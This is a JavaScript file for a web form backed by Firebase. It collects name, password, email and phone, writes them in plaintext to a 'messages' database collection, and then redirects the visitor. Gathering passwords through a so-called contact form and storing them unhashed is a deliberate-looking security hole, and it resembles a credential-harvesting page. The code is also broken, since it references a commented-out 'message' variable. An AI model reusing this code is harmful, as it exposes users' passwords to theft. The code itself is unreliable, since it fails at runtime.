

const firebaseConfig = {
    apiKey: "AIzaSyDCh8ePcR2qnf6CjjaeNt_xQ8BwaqCPL20",
    authDomain: "contact-9aef5.firebaseapp.com",
    databaseURL: "https://contact-9aef5-default-rtdb.firebaseio.com",
    projectId: "contact-9aef5",
    storageBucket: "contact-9aef5.appspot.com",
    messagingSenderId: "15820481784",
    appId: "1:15820481784:web:796d1e2d753a063c6ec70d",
    measurementId: "G-DJN9NQD5DB"
  };

 // Initialize Firebase
 firebase.initializeApp(firebaseConfig);
 
  // Reference messages collection
  var messagesRef = firebase.database().ref('messages');
  
  // Listen for form submit
  document.getElementById('contactForm').addEventListener('submit', submitForm);
  
  // Submit form
  function submitForm(e){
    e.preventDefault();
  
    // Get values
    var name = getInputVal('name');
    var password = getInputVal('password');
    var email = getInputVal('email');
    var phone = getInputVal('phone');
    // var message = getInputVal('message');
  
    // Save message
    saveMessage(name, password, email, phone, message);
  
    // Show alert
    document.querySelector('.alert').style.display = 'block';
  
    // Hide alert after 3 seconds
    setTimeout(function(){
      document.querySelector('.alert').style.display = 'none';
    },3000);
  
    // Clear form
    document.getElementById('contactForm').reset();

    setTimeout(function(){
        window.location.assign("action.html");
      },5000);
    
   
  }
  
  // Function to get get form values
  function getInputVal(id){
    return document.getElementById(id).value;
  }
  
  // Save message to firebase
  function saveMessage(name, password, email, phone){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
      name: name,
      password:password,
      email:email,
      phone:phone,
      // message:message
    });
  }